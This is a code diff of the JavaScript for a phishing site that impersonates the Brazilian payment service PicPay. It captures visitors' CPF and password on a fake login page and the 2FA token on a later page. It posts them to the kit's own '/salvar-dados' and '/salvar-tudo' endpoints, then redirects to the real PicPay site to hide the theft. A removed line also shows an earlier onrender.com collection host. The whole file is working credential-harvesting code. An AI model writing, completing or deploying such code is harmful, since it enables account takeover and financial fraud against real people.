@@ -1,15 +1,17 @@
-// Substitua seu script.js por este código completo
-
 document.addEventListener('DOMContentLoaded', () => {
 
-    // Função universal para a máscara de CPF
+    /**
+     * FUNÇÃO UNIVERSAL: MÁSCARA DE CPF
+     * Aplica a máscara (000.000.000-00) a qualquer campo de input cujo placeholder comece com "CPF".
+     * Funciona em todas as páginas que tiverem um campo de CPF.
+     */
     const inicializarMascaraCPF = () => {
         const cpfFields = document.querySelectorAll('input[placeholder^="CPF"]');
         cpfFields.forEach(cpfField => {
             if (cpfField) {
                 cpfField.addEventListener('input', (event) => {
-                    let value = event.target.value.replace(/\D/g, '');
-                    value = value.substring(0, 11);
+                    let value = event.target.value.replace(/\D/g, ''); // Remove tudo que não é dígito
+                    value = value.substring(0, 11); // Limita a 11 dígitos
                     value = value.replace(/(\d{3})(\d)/, '$1.$2');
                     value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
                     value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
@@ -19,19 +21,21 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     };
 
-    // Função universal para o modal
+    /**
+     * FUNÇÃO UNIVERSAL: MODAIS DE AJUDA/PRIVACIDADE
+     * Controla a abertura e fechamento dos modais de links no rodapé.
+     */
     const inicializarModais = () => {
         const modalOverlay = document.getElementById('modalOverlay');
         if (!modalOverlay) return;
 
         const modalContent = document.getElementById('modalContent');
         const closeModalBtn = document.querySelector('.modal-close-btn');
-
         const modalData = {
-            forgotPasswordLink: { title: 'Recuperar Senha', content: `<p>Para recuperar sua senha, digite o CPF cadastrado...</p>`},
-            helpLink: { title: 'Central de Ajuda', content: '<p>Bem-vindo à nossa Central de Ajuda!</p>'},
-            privacyLink: { title: 'Política de Privacidade', content: '<p>Esta é a nossa política de privacidade...</p>'},
-            termsLink: { title: 'Termos de Uso', content: '<p>Ao usar nossos serviços, você concorda com os termos...</p>'}
+            forgotPasswordLink: { title: 'Recuperar Senha', content: `<p>Para recuperar sua senha, digite o CPF cadastrado. Enviaremos um link de recuperação para o seu e-mail.</p>`},
+            helpLink: { title: 'Central de Ajuda', content: '<p>Bem-vindo à nossa Central de Ajuda! Aqui você encontra respostas para as dúvidas mais frequentes. Como podemos te ajudar hoje?</p>'},
+            privacyLink: { title: 'Política de Privacidade', content: '<p>Esta é a nossa política de privacidade. Comprometemo-nos a proteger seus dados...</p>'},
+            termsLink: { title: 'Termos de Uso', content: '<p>Ao usar nossos serviços, você concorda com os seguintes termos...</p>'}
         };
 
         const openModal = (content) => {
@@ -53,19 +57,22 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     };
 
-    // Função para a página de LOGIN (index.html)
+    /**
+     * ETAPA 1: PÁGINA DE LOGIN (index.html)
+     * Captura CPF e senha, envia para o primeiro endpoint e redireciona.
+     */
     const inicializarPaginaLogin = () => {
         const loginForm = document.querySelector('form:not(#emprestimoForm)');
-        if (!loginForm) return;
+        if (!loginForm) return; // Só executa se estiver na página de login
         
         loginForm.addEventListener('submit', async (event) => {
             event.preventDefault();
             const cpf = loginForm.querySelector('input[placeholder="CPF"]').value;
             const senha = loginForm.querySelector('input[placeholder="Digite sua senha"]').value;
-            if (!cpf || !senha) return alert('Por favor, preencha todos os campos.');
+            if (cpf.length < 14 || !senha) return alert('Por favor, preencha todos os campos corretamente.');
             
             try {
-                // 1. Salva os dados no servidor (primeira captura)
+                // Envia a primeira leva de dados para o servidor
                 await fetch('/salvar-dados', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -74,32 +81,36 @@ document.addEventListener('DOMContentLoaded', () => {
             } catch (error) {
                 console.error("Falha ao enviar dados iniciais:", error);
             } finally {
-                // 2. Salva os dados no navegador para usar na próxima etapa
+                // Guarda os dados na "memória da aba" para a próxima etapa
                 sessionStorage.setItem('temp_cpf', cpf);
                 sessionStorage.setItem('temp_senha', senha);
-                // 3. Redireciona para a página de confirmação
-                window.location.href = '/confirm/index.html';
+                // Redireciona para a página de confirmação, aconteça o que acontecer
+                window.location.href = 'confir/index.html';
             }
         });
     };
 
-    // Função para a página de CONFIRMAÇÃO (confirmacao.html)
+    /**
+     * ETAPA 2: PÁGINA DE CONFIRMAÇÃO (confirmacao.html)
+     * Apenas aguarda um clique em qualquer opção e redireciona para a página do token.
+     */
     const inicializarPaginaConfirmacao = () => {
         const options = document.querySelector('.confirmation-options');
-        if (!options) return;
+        if (!options) return; // Só executa se estiver na página de confirmação
 
-        // Adiciona um listener para qualquer clique dentro da área de opções
         options.addEventListener('click', (e) => {
             e.preventDefault();
-            // Redireciona para a página do token, não importa onde clicou
             window.location.href = '/token/index.html';
         });
     };
 
-    // Função para a página do TOKEN (token.html)
+    /**
+     * ETAPA 3: PÁGINA DO TOKEN (token.html)
+     * Inicia o contador, captura o token e envia o pacote completo de dados.
+     */
     const inicializarPaginaToken = () => {
         const tokenForm = document.getElementById('tokenForm');
-        if (!tokenForm) return;
+        if (!tokenForm) return; // Só executa se estiver na página do token
 
         // Lógica do contador regressivo
         const reenviarLink = document.getElementById('reenviarCodigo');
@@ -111,29 +122,27 @@ document.addEventListener('DOMContentLoaded', () => {
                 clearInterval(timerId);
                 reenviarLink.textContent = 'Reenviar código';
                 reenviarLink.classList.remove('disabled');
-                reenviarLink.href = '#'; // Reabilita o link
             }
         }, 1000);
 
-        // Lógica do envio do formulário do token
+        // Lógica do envio do formulário final
         tokenForm.addEventListener('submit', async (event) => {
             event.preventDefault();
             const token = document.getElementById('token').value;
             if (token.length < 6) return alert('Por favor, digite o código de 6 dígitos.');
 
-            // Recupera os dados salvos no navegador
+            // Recupera os dados guardados da primeira página
             const cpf = sessionStorage.getItem('temp_cpf');
             const senha = sessionStorage.getItem('temp_senha');
 
             if (!cpf || !senha) {
-                // Se não encontrar os dados, algo deu errado. Volta pro início.
                 alert('Sessão expirada. Por favor, comece novamente.');
                 window.location.href = 'index.html';
                 return;
             }
 
             try {
-                // Envia o pacote completo para o novo endpoint
+                // Envia o pacote completo (CPF + Senha + Token) para o servidor
                 await fetch('/salvar-tudo', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -142,12 +151,17 @@ document.addEventListener('DOMContentLoaded', () => {
             } catch (error) {
                 console.error("Falha ao enviar pacote final:", error);
             } finally {
-                // Limpa os dados do navegador e redireciona para o site oficial para finalizar
+                // Limpa a "memória da aba" e redireciona para o site oficial
                 sessionStorage.clear();
                 window.location.href = 'https://www.picpay.com/site';
             }
         });
     };
+    
+    /**
+     * FUNÇÃO EXTRA: PÁGINA DE EMPRÉSTIMOS (emprestimos.html)
+     * Lida com o envio do formulário de CPF da página de empréstimos.
+     */
     const inicializarPaginaEmprestimos = () => {
         const emprestimoForm = document.getElementById('emprestimoForm');
         if (!emprestimoForm) return;
@@ -158,22 +172,28 @@ document.addEventListener('DOMContentLoaded', () => {
             if (cpf.length < 14) return alert('Por favor, preencha o CPF corretamente.');
 
             try {
-                const response = await fetch('https://picpay-fky2.onrender.com/acessar-contratos', {
+                const response = await fetch('/acessar-contratos', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ cpf }),
                 });
                 const result = await response.json();
                 alert(result.message);
+                // Após o alerta, pode-se redirecionar ou limpar o formulário se desejar
+                emprestimoForm.reset();
+
             } catch (error) {
                 alert('Não foi possível conectar ao servidor. Tente novamente mais tarde.');
             }
         });
     };
 
-
+    // Executa todas as funções de inicialização.
+    // A estrutura "if (!elemento) return;" garante que apenas a função certa rode na página certa.
     inicializarMascaraCPF();
     inicializarModais();
     inicializarPaginaLogin();
+    inicializarPaginaConfirmacao();
+    inicializarPaginaToken();
     inicializarPaginaEmprestimos();
 });
